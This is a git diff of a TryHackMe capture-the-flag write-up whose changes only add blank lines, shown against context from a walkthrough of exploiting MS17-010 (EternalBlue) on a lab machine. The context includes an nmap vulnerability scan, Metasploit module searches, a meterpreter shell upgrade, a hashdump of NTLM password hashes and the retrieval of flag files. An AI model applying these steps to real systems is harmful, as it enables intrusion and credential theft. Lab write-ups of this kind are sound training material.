@@ -21,6 +21,7 @@ Badges: [https://tryhackme.com/ZishanAdThandar/badges/blue](https://tryhackme.co
 - Scan with nmap using command, `nmap 10.10.248.180 --script vuln -p0-1000`
 
 Output:
+
 ```bash
 Starting Nmap 7.80 ( https://nmap.org ) at 2024-02-27 10:57 IST
 Nmap scan report for 10.10.248.180
@@ -59,6 +60,7 @@ Nmap done: 1 IP address (1 host up) scanned in 34.07 seconds
 - Start Metasploit with `msfconsole`
 - Following next question, searched exploit in metasploit console with `search ms17-010` command
 Output:
+
 ```bash
 Matching Modules
 ================
@@ -85,6 +87,7 @@ Interact with a module by name or index. For example info 4, use 4 or use exploi
 - Then `run` and wait for some time.
 - `search shell_to_meterpreter` to find module to upgrade session to meterpreter.
 Output:
+
 ```bash
 Matching Modules
 ================
@@ -99,6 +102,7 @@ Interact with a module by name or index. For example info 0, use 0 or use post/m
 - Question `If you haven't already, background the previously gained shell (CTRL + Z). Research online how to convert a shell to meterpreter shell in metasploit. What is the name of the post module we will use? (Exact path, similar to the exploit we previously selected)` Answer `post/multi/manage/shell_to_meterpreter`
 - Question `Select this (use MODULE_PATH). Show options, what option are we required to change?` Answer `SESSION`
 - Run the module after setting session. If fails run it again, it will connect.
+
 ```bash
 meterpreter > shell
 Process 808 created.
@@ -136,6 +140,7 @@ Process List
 
 - Use `hashdump` to hashes.
 Output:
+
 ```bash
 meterpreter > hashdump
 Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
@@ -149,6 +154,7 @@ Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
 ## Find flags
 
 - We can goto `C:\\` abd get first flag using `cat flag1.txt`.
+
 ```bash
 meterpreter > pwd
 C:\Windows\system32
@@ -177,6 +183,7 @@ meterpreter > cat flag1.txt
 flag{********************************}
 ```
 - We can use `search -f flag2.txt` and `search -f flag2.txt` to find second and third flag to submit, as we already know the first one.
+
 ```bash
 meterpreter > search -f flag2.txt
 Found 1 result...
